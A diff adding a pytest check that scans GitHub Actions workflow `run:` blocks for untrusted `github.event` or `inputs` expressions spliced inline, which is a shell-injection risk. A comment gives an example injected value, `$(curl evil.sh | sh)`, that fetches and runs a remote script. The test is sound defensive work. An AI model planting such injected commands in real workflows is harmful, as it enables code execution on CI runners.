@@ -152,6 +152,29 @@ def _run_blocks(path: Path) -> list[tuple[str, str]]:
     return out
 
 
+# Contexts a workflow does not control the content of. `github.event.*` and `inputs.*`
+# (workflow_dispatch) can carry attacker-chosen text such as `$(curl evil.sh | sh)`;
+# splicing either straight into a `run:` block is shell injection on the runner, and
+# actionlint's own shellcheck pass does not catch it (it replaces `${{ }}` with a
+# placeholder before handing the script to shellcheck, same as `_run_blocks` below).
+_UNTRUSTED_EXPRESSION = re.compile(r"\$\{\{\s*(github\.event\.|inputs\.)")
+
+
+@pytest.mark.parametrize("path", _all_workflows(), ids=lambda p: p.name)
+def test_no_run_block_interpolates_an_untrusted_expression(path: Path) -> None:
+    """User-controlled input must reach a `run:` block through `env:`, never inline.
+
+    `env: {X: ${{ inputs.foo }}}` then `$X` in the script is safe: the shell sees an
+    environment variable, not attacker-controlled syntax. `ARGS="--source ${{ inputs.foo
+    }}"` is not: GitHub substitutes the raw string before bash ever parses it.
+    """
+    for label, script in _run_blocks(path):
+        assert not _UNTRUSTED_EXPRESSION.search(script), (
+            f"{label} interpolates an untrusted expression directly into shell -- pass "
+            "it through env: instead"
+        )
+
+
 @pytest.mark.parametrize("path", _all_workflows(), ids=lambda p: p.name)
 def test_the_shell_in_every_run_block_parses(path: Path) -> None:
     """`bash -n` over each `run:` block.
